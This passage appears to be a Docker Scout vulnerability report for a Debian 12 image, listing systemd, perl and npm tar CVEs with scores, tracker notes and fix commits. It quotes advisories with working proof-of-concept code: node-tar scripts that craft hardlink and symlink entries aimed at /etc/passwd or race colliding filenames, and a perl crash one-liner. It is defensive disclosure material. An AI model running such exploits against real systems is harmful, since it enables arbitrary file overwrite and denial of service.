<a href="https://scout.docker.com/v/CVE-2025-4598?s=debian&n=systemd&ns=debian&t=deb&osn=debian&osv=12&vr=%3C252.38-1%7Edeb12u1"><img alt="medium : CVE--2025--4598" src="https://img.shields.io/badge/CVE--2025--4598-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><252.38-1~deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>252.38-1~deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.041%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>12th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in systemd-coredump. This flaw allows an attacker to force a SUID process to crash and replace it with a non-SUID binary to access the original's privileged process coredump, allowing the attacker to read sensitive data, such as /etc/shadow content, loaded by the original process.  A SUID binary or process has a special type of permission, which allows the process to run with the file owner's permissions, regardless of the user executing the binary. This allows the process to access more restricted data than unprivileged users or processes would be able to. An attacker can leverage this flaw by forcing a SUID process to crash and force the Linux kernel to recycle the process PID before systemd-coredump can analyze the /proc/pid/auxv file. If the attacker wins the race condition, they gain access to the original's SUID process coredump file. They can read sensitive content loaded into memory by the original binary, affecting data confidentiality.

---
- systemd 257.6-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1106785)
https://www.qualys.com/2025/05/29/apport-coredump/apport-coredump.txt
For a comprehensive fix a kernel change is required (to hand a pidfd to the usermode
coredump helper):
https://git.kernel.org/linus/b5325b2a270fcaf7b2a9a0f23d422ca8a5a8bdea
Backports (src:linux):
https://lore.kernel.org/linux-fsdevel/CAMw=ZnT4KSk_+Z422mEZVzfAkTueKvzdw=r9ZB2JKg5-1t6BDw@mail.gmail.com/
Fixed by: https://github.com/systemd/systemd/commit/49f1f2d4a7612bbed5211a73d11d6a94fbe3bb69 (main)
Fixed by: https://github.com/systemd/systemd/commit/0c49e0049b7665bb7769a13ef346fef92e1ad4d6 (main)
Fixed by: https://github.com/systemd/systemd/commit/8fc7b2a211eb13ef1a94250b28e1c79cab8bdcb9 (main)
Follow up (optional): https://github.com/systemd/systemd/commit/13902e025321242b1d95c6d8b4e482b37f58cdef (main)
Follow up (optional): https://github.com/systemd/systemd/commit/868d95577ec9f862580ad365726515459be582fc (main)
Follow up (optional): https://github.com/systemd/systemd/commit/e6a8687b939ab21854f12f59a3cce703e32768cf (main)
Follow up (optional): https://github.com/systemd/systemd/commit/76e0ab49c47965877c19772a2b3bf55f6417ca39 (main)
Follow up (optional): https://github.com/systemd/systemd/commit/9ce8e3e449def92c75ada41b7d10c5bc3946be77 (main)
Fixed by: https://github.com/systemd/systemd/commit/0c49e0049b7665bb7769a13ef346fef92e1ad4d6 (v258)
Fixed by: https://github.com/systemd/systemd/commit/868d95577ec9f862580ad365726515459be582fc (v258)
Fixed by: https://github.com/systemd/systemd/commit/c58a8a6ec9817275bb4babaa2c08e0e35090d4e3 (v257.6)
Fixed by: https://github.com/systemd/systemd/commit/61556694affa290c0a16d48717b3892b85622d96 (v257.6)
Fixed by: https://github.com/systemd/systemd/commit/19d439189ab85dd7222bdd59fd442bbcc8ea99a7 (v256.16)
Fixed by: https://github.com/systemd/systemd-stable/commit/254ab8d2a7866679cee006d844d078774cbac3c9 (v255.21)
Fixed by: https://github.com/systemd/systemd-stable/commit/7fc7aa5a4d28d7768dfd1eb85be385c3ea949168 (v254.26)
Fixed by: https://github.com/systemd/systemd-stable/commit/19b228662e0fcc6596c0395a0af8486a4b3f1627 (v253.33)
Fixed by: https://github.com/systemd/systemd-stable/commit/2eb46dce078334805c547cbcf5e6462cf9d2f9f0 (v252.38)
Issue relates to race condition exploitable while checking if a user should
be allowed to read a core file or not via the grant_user_access() function,
which was introduced as part of the fix for CVE-2022-4415.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-31439?s=debian&n=systemd&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D252.39-1%7Edeb12u1"><img alt="low : CVE--2023--31439" src="https://img.shields.io/badge/CVE--2023--31439-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=252.39-1~deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.094%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>27th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in systemd 253. An attacker can modify the contents of past events in a sealed log file and then adjust the file such that checking the integrity shows no error, despite modifications. NOTE: the vendor reportedly sent "a reply denying that any of the finding was a security vulnerability."

---
- systemd <unfixed> (unimportant)
Disputed by upstream
https://github.com/kastel-security/Journald/blob/main/journald-publication.pdf

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-31438?s=debian&n=systemd&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D252.39-1%7Edeb12u1"><img alt="low : CVE--2023--31438" src="https://img.shields.io/badge/CVE--2023--31438-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=252.39-1~deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.100%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>28th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in systemd 253. An attacker can truncate a sealed log file and then resume log sealing such that checking the integrity shows no error, despite modifications. NOTE: the vendor reportedly sent "a reply denying that any of the finding was a security vulnerability."

---
- systemd <unfixed> (unimportant)
Disputed by upstream
https://github.com/kastel-security/Journald/blob/main/journald-publication.pdf

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-31437?s=debian&n=systemd&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D252.39-1%7Edeb12u1"><img alt="low : CVE--2023--31437" src="https://img.shields.io/badge/CVE--2023--31437-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=252.39-1~deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.128%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>33rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in systemd 253. An attacker can modify a sealed log file such that, in some views, not all existing and sealed log messages are displayed. NOTE: the vendor reportedly sent "a reply denying that any of the finding was a security vulnerability."

---
- systemd <unfixed> (unimportant)
Disputed by upstream
https://github.com/kastel-security/Journald/blob/main/journald-publication.pdf

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2013-4392?s=debian&n=systemd&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D252.39-1%7Edeb12u1"><img alt="low : CVE--2013--4392" src="https://img.shields.io/badge/CVE--2013--4392-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=252.39-1~deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.042%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>13th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

systemd, when updating file permissions, allows local users to change the permissions and SELinux security contexts for arbitrary files via a symlink attack on unspecified files.

---
- systemd <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=725357)
[wheezy] - systemd <not-affected> (/etc/tmpfiles.d not supported in Wheezy)
https://bugzilla.redhat.com/show_bug.cgi?id=859060
only relevant to systems running systemd along with selinux

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 2" src="https://img.shields.io/badge/H-2-e25d68"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 3" src="https://img.shields.io/badge/L-3-fce1a9"/> <!-- unspecified: 0 --><strong>perl</strong> <code>5.36.0-7</code> (deb)</summary>

<small><code>pkg:deb/debian/perl@5.36.0-7?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2023-31484?s=debian&n=perl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C5.36.0-7%2Bdeb12u3"><img alt="high : CVE--2023--31484" src="https://img.shields.io/badge/CVE--2023--31484-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><5.36.0-7+deb12u3</code></td></tr>
<tr><td>Fixed version</td><td><code>5.36.0-7+deb12u3</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.160%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>78th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

CPAN.pm before 2.35 does not verify TLS certificates when downloading distributions over HTTPS.

---
[experimental] - perl 5.38.0~rc2-1
- perl 5.38.2-2 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1035109)
[bookworm] - perl 5.36.0-7+deb12u3
[buster] - perl <no-dsa> (Minor issue)
https://github.com/andk/cpanpm/pull/175
https://github.com/andk/cpanpm/commit/9c98370287f4e709924aee7c58ef21c85289a7f0 (2.35-TRIAL)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-47038?s=debian&n=perl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C5.36.0-7%2Bdeb12u1"><img alt="high : CVE--2023--47038" src="https://img.shields.io/badge/CVE--2023--47038-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><5.36.0-7+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>5.36.0-7+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.108%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>30th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in perl 5.30.0 through 5.38.0. This issue occurs when a crafted regular expression is compiled by perl, which can allow an attacker controlled byte buffer overflow in a heap allocated buffer.

---
- perl 5.36.0-10 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1056746)
[bookworm] - perl 5.36.0-7+deb12u1
[bullseye] - perl 5.32.1-4+deb11u3
[buster] - perl <not-affected> (Vulnerable code introduced later)
Fixed by: https://github.com/Perl/perl5/commit/12c313ce49b36160a7ca2e9b07ad5bd92ee4a010 (v5.34.2)
Fixed by: https://github.com/Perl/perl5/commit/7047915eef37fccd93e7cd985c29fe6be54650b6 (v5.36.2)
Fixed by: https://github.com/Perl/perl5/commit/92a9eb3d0d52ec7655c1beb29999a5a5219be664 (v5.38.1)
Fixed by: https://github.com/Perl/perl5/commit/ff1f9f59360afeebd6f75ca1502f5c3ebf077da3 (bleed)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-40909?s=debian&n=perl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C5.36.0-7%2Bdeb12u3"><img alt="medium : CVE--2025--40909" src="https://img.shields.io/badge/CVE--2025--40909-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><5.36.0-7+deb12u3</code></td></tr>
<tr><td>Fixed version</td><td><code>5.36.0-7+deb12u3</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.010%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Perl threads have a working directory race condition where file operations may target unintended paths.  If a directory handle is open at thread creation, the process-wide current working directory is temporarily changed in order to clone that handle for the new thread, which is visible from any third (or more) thread already running.   This may lead to unintended operations such as loading code or accessing files from unexpected locations, which a local attacker may be able to exploit.  The bug was introduced in commit 11a11ecf4bea72b17d250cfb43c897be1341861e and released in Perl version 5.13.6

---
[experimental] - perl 5.40.1-4
- perl 5.40.1-5 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1098226)
[bookworm] - perl 5.36.0-7+deb12u3
[bullseye] - perl <postponed> (Minor issue, revisit when fixed upstream)
https://github.com/Perl/perl5/issues/23010
Fixed by: https://github.com/Perl/perl5/commit/fc8063aa51f400394f2e44173fd4f87f080502c9 (v5.41.13)
Fixed by: https://github.com/Perl/perl5/commit/a1327b5df78d0bc1e56b6cff663aa8b508d4e2d6 (v5.41.13)
Fixed by: https://github.com/Perl/perl5/commit/1f9097b342e0e37d619dfab6ea82ea99611b30bf (v5.41.13)
Fixed by: https://github.com/Perl/perl5/commit/5c2e7577a3fa70dc39d27c0426db6eb897eee9b1 (v5.41.13)
Squashed version of fix (to help backports):
https://github.com/Perl/perl5/commit/918bfff86ca8d6d4e4ec5b30994451e0bd74aba9
https://lists.security.metacpan.org/cve-announce/msg/30017499/

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-56406?s=debian&n=perl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C5.36.0-7%2Bdeb12u2"><img alt="low : CVE--2024--56406" src="https://img.shields.io/badge/CVE--2024--56406-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><5.36.0-7+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>5.36.0-7+deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.025%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A heap buffer overflow vulnerability was discovered in Perl.   Release branches 5.34, 5.36, 5.38 and 5.40 are affected, including development versions from 5.33.1 through 5.41.10.  When there are non-ASCII bytes in the left-hand-side of the `tr` operator, `S_do_trans_invmap` can overflow the destination pointer `d`.     $ perl -e '$_ = "\x{FF}" x 1000000; tr/\xFF/\x{100}/;'     Segmentation fault (core dumped)  It is believed that this vulnerability can enable Denial of Service and possibly Code Execution attacks on platforms that lack sufficient defenses.

---
- perl 5.40.1-3
[bullseye] - perl <not-affected> (Vulnerable code introduced later)
https://lists.security.metacpan.org/cve-announce/msg/28708725/
Introduced by: https://github.com/Perl/perl5/commit/a311ee08b6781f83a7785f578a26bbc21a7ae457 (v5.33.1)
Fixed by: https://github.com/Perl/perl5/commit/87f42aa0e0096e9a346c9672aa3a0bd3bef8c1dd

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-31486?s=debian&n=perl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D5.36.0-7%2Bdeb12u3"><img alt="low : CVE--2023--31486" src="https://img.shields.io/badge/CVE--2023--31486-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=5.36.0-7+deb12u3</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.560%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>68th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

HTTP::Tiny before 0.083, a Perl core module since 5.13.9 and available standalone on CPAN, has an insecure default TLS configuration where users must opt in to verify certificates.

---
- libhttp-tiny-perl 0.088-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=962407; unimportant)
[experimental] - perl 5.38.0~rc2-1
- perl 5.38.2-2 (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=954089)
https://www.openwall.com/lists/oss-security/2023/04/18/14
https://github.com/chansen/p5-http-tiny/issues/134
https://blog.hackeriet.no/perl-http-tiny-insecure-tls-default-affects-cpan-modules/
https://hackeriet.github.io/cpan-http-tiny-overview/
Applications need to explicitly opt in to enable verification.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2011-4116?s=debian&n=perl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D5.36.0-7%2Bdeb12u3"><img alt="low : CVE--2011--4116" src="https://img.shields.io/badge/CVE--2011--4116-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=5.36.0-7+deb12u3</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.195%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>42nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

_is_safe in the File::Temp module for Perl does not properly handle symlinks.

---
- perl <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=776268)
http://thread.gmane.org/gmane.comp.security.oss.general/6174/focus=6177
https://github.com/Perl-Toolchain-Gang/File-Temp/issues/14

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 2" src="https://img.shields.io/badge/H-2-e25d68"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>tar</strong> <code>6.1.15</code> (npm)</summary>

<small><code>pkg:npm/tar@6.1.15</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-23950?s=github&n=tar&t=npm&vr=%3C%3D7.5.3"><img alt="high 8.8: CVE--2026--23950" src="https://img.shields.io/badge/CVE--2026--23950-lightgrey?label=high%208.8&labelColor=e25d68"/></a> <i>Improper Handling of Unicode Encoding</i>

<table>
<tr><td>Affected range</td><td><code><=7.5.3</code></td></tr>
<tr><td>Fixed version</td><td><code>7.5.4</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.8</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:H/A:L</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.014%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>2nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

**TITLE**: Race Condition in node-tar Path Reservations via Unicode Sharp-S (ß) Collisions on macOS APFS

**AUTHOR**: Tomás Illuminati

### Details

A race condition vulnerability exists in `node-tar` (v7.5.3) this is to an incomplete handling of Unicode path collisions in the `path-reservations` system. On case-insensitive or normalization-insensitive filesystems (such as macOS APFS, In which it has been tested), the library fails to lock colliding paths (e.g., `ß` and `ss`), allowing them to be processed in parallel. This bypasses the library's internal concurrency safeguards and permits Symlink Poisoning attacks via race conditions. The library uses a `PathReservations` system to ensure that metadata checks and file operations for the same path are serialized. This prevents race conditions where one entry might clobber another concurrently.

```typescript
// node-tar/src/path-reservations.ts (Lines 53-62)
reserve(paths: string[], fn: Handler) {
    paths =
      isWindows ?
        ['win32 parallelization disabled']
      : paths.map(p => {
          return stripTrailingSlashes(
            join(normalizeUnicode(p)), // <- THE PROBLEM FOR MacOS FS
          ).toLowerCase()
        })

```

In MacOS the ```join(normalizeUnicode(p)), ``` FS confuses ß with ss, but this code does not. For example:

``````bash
bash-3.2$ printf "CONTENT_SS\n" > collision_test_ss
bash-3.2$ ls
collision_test_ss
bash-3.2$ printf "CONTENT_ESSZETT\n" > collision_test_ß
bash-3.2$ ls -la
total 8
drwxr-xr-x   3 testuser  staff    96 Jan 19 01:25 .
drwxr-x---+ 82 testuser  staff  2624 Jan 19 01:25 ..
-rw-r--r--   1 testuser  staff    16 Jan 19 01:26 collision_test_ss
bash-3.2$ 
``````

---

### PoC

``````javascript
const tar = require('tar');
const fs = require('fs');
const path = require('path');
const { PassThrough } = require('stream');

const exploitDir = path.resolve('race_exploit_dir');
if (fs.existsSync(exploitDir)) fs.rmSync(exploitDir, { recursive: true, force: true });
fs.mkdirSync(exploitDir);

console.log('[*] Testing...');
console.log(`[*] Extraction target: ${exploitDir}`);

// Construct stream
const stream = new PassThrough();

const contentA = 'A'.repeat(1000);
const contentB = 'B'.repeat(1000);

// Key 1: "f_ss"
const header1 = new tar.Header({
    path: 'collision_ss',
    mode: 0o644,
    size: contentA.length,
});
header1.encode();

// Key 2: "f_ß"
const header2 = new tar.Header({
    path: 'collision_ß',
    mode: 0o644,
    size: contentB.length,
});
header2.encode();

// Write to stream
stream.write(header1.block);
stream.write(contentA);
stream.write(Buffer.alloc(512 - (contentA.length % 512))); // Padding

stream.write(header2.block);
stream.write(contentB);
stream.write(Buffer.alloc(512 - (contentB.length % 512))); // Padding

// End
stream.write(Buffer.alloc(1024));
stream.end();

// Extract
const extract = new tar.Unpack({
    cwd: exploitDir,
    // Ensure jobs is high enough to allow parallel processing if locks fail
    jobs: 8 
});

stream.pipe(extract);

extract.on('end', () => {
    console.log('[*] Extraction complete');

    // Check what exists
    const files = fs.readdirSync(exploitDir);
    console.log('[*] Files in exploit dir:', files);
    files.forEach(f => {
        const p = path.join(exploitDir, f);
        const stat = fs.statSync(p);
        const content = fs.readFileSync(p, 'utf8');
        console.log(`File: ${f}, Inode: ${stat.ino}, Content: ${content.substring(0, 10)}... (Length: ${content.length})`);
    });

    if (files.length === 1 || (files.length === 2 && fs.statSync(path.join(exploitDir, files[0])).ino === fs.statSync(path.join(exploitDir, files[1])).ino)) {
        console.log('\[*] GOOD');
    } else {
        console.log('[-] No collision');
    }
});

``````

---

### Impact
This is a **Race Condition** which enables **Arbitrary File Overwrite**. This vulnerability affects users and systems using **node-tar on macOS (APFS/HFS+)**. Because of using `NFD` Unicode normalization (in which `ß` and `ss` are different), conflicting paths do not have their order properly preserved under filesystems that ignore Unicode normalization (e.g., APFS (in which `ß` causes an inode collision with `ss`)). This enables an attacker to circumvent internal parallelization locks (`PathReservations`) using conflicting filenames within a malicious tar archive.

---

### Remediation

Update `path-reservations.js` to use a normalization form that matches the target filesystem's behavior (e.g., `NFKD`), followed by first `toLocaleLowerCase('en')` and then `toLocaleUpperCase('en')`.

Users who cannot upgrade promptly, and who are programmatically using `node-tar` to extract arbitrary tarball data should filter out all `SymbolicLink` entries (as npm does) to defend against arbitrary file writes via this file system entry name collision issue.

---

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-23745?s=github&n=tar&t=npm&vr=%3C%3D7.5.2"><img alt="high 8.2: CVE--2026--23745" src="https://img.shields.io/badge/CVE--2026--23745-lightgrey?label=high%208.2&labelColor=e25d68"/></a> <i>Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</i>

<table>
<tr><td>Affected range</td><td><code><=7.5.2</code></td></tr>
<tr><td>Fixed version</td><td><code>7.5.3</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.2</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:A/VC:H/VI:L/VA:N/SC:H/SI:L/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.005%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>0th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

The `node-tar` library (`<= 7.5.2`) fails to sanitize the `linkpath` of `Link` (hardlink) and `SymbolicLink` entries when `preservePaths` is false (the default secure behavior). This allows malicious archives to bypass the extraction root restriction, leading to **Arbitrary File Overwrite** via hardlinks and **Symlink Poisoning** via absolute symlink targets.

### Details

The vulnerability exists in `src/unpack.ts` within the `[HARDLINK]` and `[SYMLINK]` methods.

**1. Hardlink Escape (Arbitrary File Overwrite)**

The extraction logic uses `path.resolve(this.cwd, entry.linkpath)` to determine the hardlink target. Standard Node.js behavior dictates that if the second argument (`entry.linkpath`) is an **absolute path**, `path.resolve` ignores the first argument (`this.cwd`) entirely and returns the absolute path.

The library fails to validate that this resolved target remains within the extraction root. A malicious archive can create a hardlink to a sensitive file on the host (e.g., `/etc/passwd`) and subsequently write to it, if file permissions allow writing to the target file, bypassing path-based security measures that may be in place.

**2. Symlink Poisoning**

The extraction logic passes the user-supplied `entry.linkpath` directly to `fs.symlink` without validation. This allows the creation of symbolic links pointing to sensitive absolute system paths or traversing paths (`../../`), even when secure extraction defaults are used.

### PoC

The following script generates a binary TAR archive containing malicious headers (a hardlink to a local file and a symlink to `/etc/passwd`). It then extracts the archive using standard `node-tar` settings and demonstrates the vulnerability by verifying that the local "secret" file was successfully overwritten.

```javascript
const fs = require('fs')
const path = require('path')
const tar = require('tar')

const out = path.resolve('out_repro')
const secret = path.resolve('secret.txt')
const tarFile = path.resolve('exploit.tar')
const targetSym = '/etc/passwd'

// Cleanup & Setup
try { fs.rmSync(out, {recursive:true, force:true}); fs.unlinkSync(secret) } catch {}
fs.mkdirSync(out)
fs.writeFileSync(secret, 'ORIGINAL_DATA')

// 1. Craft malicious Link header (Hardlink to absolute local file)
const h1 = new tar.Header({
  path: 'exploit_hard',
  type: 'Link',
  size: 0,
  linkpath: secret 
})
h1.encode()

// 2. Craft malicious Symlink header (Symlink to /etc/passwd)
const h2 = new tar.Header({
  path: 'exploit_sym',
  type: 'SymbolicLink',
  size: 0,
  linkpath: targetSym 
})
h2.encode()

// Write binary tar
fs.writeFileSync(tarFile, Buffer.concat([ h1.block, h2.block, Buffer.alloc(1024) ]))

console.log('[*] Extracting malicious tarball...')

// 3. Extract with default secure settings
tar.x({
  cwd: out,
  file: tarFile,
  preservePaths: false
}).then(() => {
  console.log('[*] Verifying payload...')

  // Test Hardlink Overwrite
  try {
    fs.writeFileSync(path.join(out, 'exploit_hard'), 'OVERWRITTEN')
    
    if (fs.readFileSync(secret, 'utf8') === 'OVERWRITTEN') {
      console.log('[+] VULN CONFIRMED: Hardlink overwrite successful')
    } else {
      console.log('[-] Hardlink failed')
    }
  } catch (e) {}

  // Test Symlink Poisoning
  try {
    if (fs.readlinkSync(path.join(out, 'exploit_sym')) === targetSym) {
      console.log('[+] VULN CONFIRMED: Symlink points to absolute path')
    } else {
      console.log('[-] Symlink failed')
    }
  } catch (e) {}
})

```

### Impact

* **Arbitrary File Overwrite:** An attacker can overwrite any file the extraction process has access to, bypassing path-based security restrictions. It does not grant write access to files that the extraction process does not otherwise have access to, such as root-owned configuration files.
* **Remote Code Execution (RCE):** In CI/CD environments or automated pipelines, overwriting configuration files, scripts, or binaries leads to code execution. (However, npm is unaffected, as it filters out all `Link` and `SymbolicLink` tar entries from extracted packages.)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-28863?s=github&n=tar&t=npm&vr=%3C6.2.1"><img alt="medium 6.5: CVE--2024--28863" src="https://img.shields.io/badge/CVE--2024--28863-lightgrey?label=medium%206.5&labelColor=fbb552"/></a> <i>Uncontrolled Resource Consumption</i>

<table>
<tr><td>Affected range</td><td><code><6.2.1</code></td></tr>
<tr><td>Fixed version</td><td><code>6.2.1</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.450%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>63rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

## Description: 
During some analysis today on npm's `node-tar` package I came across the folder creation process, Basicly if you provide node-tar with a path like this `./a/b/c/foo.txt` it would create every folder and sub-folder here a, b and c until it reaches the last folder to create `foo.txt`, In-this case I noticed that there's no validation at all on the amount of folders being created, that said we're actually able to CPU and memory consume the system running node-tar and even crash the nodejs client within few seconds of running it using a path with too many sub-folders inside

## Steps To Reproduce:
You can reproduce this issue by downloading the tar file I provided in the resources and using node-tar to extract it, you should get the same behavior as the video

## Proof Of Concept:
Here's a [video](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/3i7uojw8s52psar6pg8zkdo4h9io?response-content-disposition=attachment%3B%20filename%3D%22tar-dos-poc.webm%22%3B%20filename%2A%3DUTF-8%27%27tar-dos-poc.webm&response-content-type=video%2Fwebm&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSWWGDXHA%2F20240312%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240312T080103Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDcaCXVzLXdlc3QtMiJHMEUCID3xYDc6emXVPOg8iVR5dVk0u3gguTPIDJ0OIE%2BKxj17AiEAi%2BGiay1gGMWhH%2F031fvMYnSsa8U7CnpZpxvFAYqNRwgqsQUIQBADGgwwMTM2MTkyNzQ4NDkiDAaj6OgUL3gg4hhLLCqOBUUrOgWSqaK%2FmxN6nKRvB4Who3LIyzswFKm9LV94GiSVFP3zXYA480voCmAHTg7eBL7%2BrYgV2RtXbhF4aCFMCN3qu7GeXkIdH7xwVMi9zXHkekviSKZ%2FsZtVVjn7RFqOCKhJl%2FCoiLQJuDuju%2FtfdTGZbEbGsPgKHoILYbRp81K51zeRL21okjsOehmypkZzq%2BoGrXIX0ynPOKujxw27uqdF4T%2BF9ynodq01vGgwgVBEjHojc4OKOfr1oW5b%2FtGVV59%2BOBVI1hqIKHRG0Ed4SWmp%2BLd1hazGuZPvp52szmegnOj5qr3ubppnKL242bX%2FuAnQKzKK0HpwolqXjsuEeFeM85lxhqHV%2B1BJqaqSHHDa0HUMLZistMRshRlntuchcFQCR6HBa2c8PSnhpVC31zMzvYMfKsI12h4HB6l%2FudrmNrvmH4LmNpi4dZFcio21DzKj%2FRjWmxjH7l8egDyG%2FIgPMY6Ls4IiN7aR1jijYTrBCgPUUHets3BFvqLzHtPFnG3B7%2FYRPnhCLu%2FgzvKN3F8l38KqeTNMHJaxkuhCvEjpFB2SJbi2QZqZZbLj3xASqXoogzbsyPp0Tzp0tH7EKDhPA7H6wwiZukXfFhhlYzP8on9fO2Ajz%2F%2BTDkDjbfWw4KNJ0cFeDs